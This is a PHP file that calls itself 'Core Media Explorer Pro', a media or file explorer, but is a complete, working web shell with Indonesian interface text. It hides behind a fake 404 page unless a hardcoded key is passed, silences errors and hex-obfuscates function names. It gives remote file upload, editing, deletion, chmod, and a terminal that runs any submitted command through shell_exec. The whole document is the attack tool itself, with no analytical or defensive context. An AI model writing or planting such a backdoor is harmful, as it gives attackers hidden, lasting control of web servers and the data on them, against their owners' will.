<?php
/**
 * Core Media Explorer Pro v4.4 - Extended Edition
 */
error_reporting(0);
@ini_set('display_errors', 0);

$k = 'c0r'; 
if (!isset($_GET['key']) || $_GET['key'] !== $k) {
    header('HTTP/1.1 404 Not Found');
    exit;
}

// Obfuscated functions
$sd = "\x73\x63\x61\x6e\x64\x69\x72"; 
$fg = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"; 
$fp = "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"; 

$self_dir = dirname(__FILE__);
$path = isset($_GET['path']) ? $_GET['path'] : $self_dir;
$path = realpath($path);
if ($path) chdir($path);

$msg = "";

// --- LOGIC HANDLERS ---

// Upload
if (isset($_FILES['u_file'])) {
    if (@move_uploaded_file($_FILES['u_file']['tmp_name'], $_FILES['u_file']['name'])) $msg = "Upload Berhasil!";
}
// Chmod
if (isset($_GET['chmod']) && isset($_GET['file'])) {
    if (@chmod($_GET['file'], octdec($_GET['chmod']))) $msg = "Chmod Berhasil!";
}
// Rename
if (isset($_GET['newname']) && isset($_GET['oldname'])) {
    if (@rename($_GET['oldname'], $_GET['newname'])) $msg = "Rename Berhasil!";
}
// Create Folder
if (isset($_POST['newfolder'])) {
    if (@mkdir($_POST['newfolder'])) $msg = "Folder Dibuat!";
}
// Create File
if (isset($_POST['newfile'])) {
    if ($fp($_POST['newfile'], "")) $msg = "File Dibuat!";
}
// Delete File/Folder
if (isset($_GET['del'])) {
    $target = basename($_GET['del']);
    if (is_dir($target)) {
        shell_exec("rm -rf " . escapeshellarg($target)); // Force delete folder
    } else {
        @unlink($target);
    }
    header("Location: ?key=$k&path=$path");
    exit;
}

$cmd_out = "";
if (isset($_POST['cmd'])) {
    $cmd_out = shell_exec($_POST['cmd'] . " 2>&1");
}
if (isset($_POST['s'])) {
    if ($fp($_POST['n'], $_POST['c']) !== false) $msg = "File Tersimpan!";
}

// --- UI RENDER ---
echo "<html><head><title>Explorer Pro v4.4</title><style>
body{font:12px 'Segoe UI',Tahoma,sans-serif;background:#1a1a1a;color:#ccc;padding:20px;} 
a{color:#00ff00;text-decoration:none;} 
a:hover{text-decoration:underline;}
.bread, .info-box{background:#252525;padding:15px;border-radius:5px;margin-bottom:15px;border-left:5px solid #0f0;}
.info-box{display: flex; gap: 20px; font-family: monospace; font-size: 11px;}
.info-box b{color: #0f0;}
.bread{font-family:monospace; display:flex; align-items:center; gap:10px;}
.home-btn{background:#0f0; color:#000; padding:2px 8px; border-radius:3px; font-weight:bold; font-size:11px;}
.home-btn:hover{background:#fff; color:#000; text-decoration:none;}
.box{border:1px solid #333;padding:10px;margin-bottom:15px;background:#222;}
input,textarea{background:#2a2a2a;color:#0f0;border:1px solid #444;padding:5px;margin:2px;}
table{width:100%; border-collapse: collapse; background:#222; margin-top:10px;}
th{background:#333; color:#0f0; padding:10px; text-align:left; border:1px solid #444;}
td{padding:8px; border:1px solid #333; font-family:monospace;}
tr:hover{background:#2a2a2a;}
.folder-link{color:#ffff00; font-weight:bold;}
pre{background:#000; padding:10px; border:1px solid #0f0; color:#0f0; white-space: pre-wrap;}
</style></head><body>";

// SERVER INFO PANEL
echo "<div class='info-box'>";
echo "<span><b>OS:</b> ".php_uname()."</span>";
echo "<span><b>IP:</b> ".$_SERVER['SERVER_ADDR']."</span>";
echo "<span><b>PHP:</b> ".phpversion()."</span>";
echo "<span><b>SERVER:</b> ".$_SERVER['SERVER_SOFTWARE']."</span>";
echo "</div>";

// Breadcrumbs
echo "<div class='bread'>";
echo "<a href='?key=$k&path=$self_dir' class='home-btn'>HOME</a>";
echo "<b>PATH:</b> ";
$parts = explode(DIRECTORY_SEPARATOR, $path);
$accum = "";
foreach ($parts as $p) {
    if ($p === "" && DIRECTORY_SEPARATOR === '/') { echo "<a href='?key=$k&path=/'>/</a>"; continue; }
    if ($p === "") continue;
    $accum .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?key=$k&path=$accum'>$p</a> / ";
}
echo "</div>";

if($msg) echo "<div style='color:#fff; background:darkgreen; padding:8px; margin-bottom:10px;'>[*] $msg</div>";

// TOOLS PANEL
echo "<div style='display:flex; flex-wrap:wrap; gap:10px;'>
    <div class='box' style='flex:1;'><b>Upload</b><br><form method='POST' enctype='multipart/form-data'><input type='file' name='u_file'><input type='submit' value='Go'></form></div>
    <div class='box' style='flex:1;'><b>New Item</b><br>
        <form method='POST'><input type='text' name='newfile' placeholder='New File.txt'><input type='submit' value='+ File'></form>
        <form method='POST'><input type='text' name='newfolder' placeholder='New Folder'><input type='submit' value='+ Folder'></form>
    </div>
    <div class='box' style='flex:2;'><b>Terminal</b><br><form method='POST'><input type='text' name='cmd' style='width:80%;' placeholder='Command...'><input type='submit' value='Exec'></form></div>
</div>";

if ($cmd_out) echo "<pre>$cmd_out</pre>";

echo "<table><thead><tr><th>Nama</th><th width='100'>Ukuran</th><th width='80'>Perms</th><th width='250'>Aksi</th></tr></thead><tbody>";

$items = $sd($path);
foreach ($items as $i) {
    if ($i == "." || $i == "..") continue;
    $full = $path . DIRECTORY_SEPARATOR . $i;
    $prm = substr(sprintf('%o', @fileperms($full)), -4);
    echo "<tr>";
    
    // JS Rename Helper
    $jsRename = "javascript:p=prompt('Rename To:', '$i'); if(p) location.href='?key=$k&path=$path&oldname=$i&newname='+p;";

    if (@is_dir($full)) {
        echo "<td><a href='?key=$k&path=$full' class='folder-link'>[ $i ]</a></td><td>DIR</td><td>$prm</td>
        <td><a href='?key=$k&path=$full'>OPEN</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?key=$k&path=$path&del=$i' onclick='return confirm(\"Hapus Folder?\")'>DEL</a></td>";
    } else {
        $sz = round(@filesize($full)/1024, 2) . " KB";
        echo "<td>$i</td><td>$sz</td><td>$prm</td>
        <td><a href='?key=$k&path=$path&edit=$i'>EDIT</a> | <a href=\"$jsRename\">RENAME</a> | <a href='?key=$k&path=$path&del=$i' onclick='return confirm(\"Hapus File?\")'>DEL</a> | <a href='javascript:void(0)' onclick='p=prompt(\"Chmod:\",\"$prm\");if(p)location.href=\"?key=$k&path=$path&file=$i&chmod=\"+p'>CHMOD</a></td>";
    }
    echo "</tr>";
}
echo "</tbody></table>";

if (isset($_GET['edit'])) {
    $fn = basename($_GET['edit']);
    echo "<div class='box' style='margin-top:20px;'><h4>Editing: $fn</h4><form method='POST'><input type='hidden' name='n' value='$fn'><textarea name='c' style='width:100%;height:400px;'>".htmlspecialchars($fg($fn))."</textarea><br><input type='submit' name='s' value='SAVE CHANGES'></form></div>";
}
echo "</body></html>";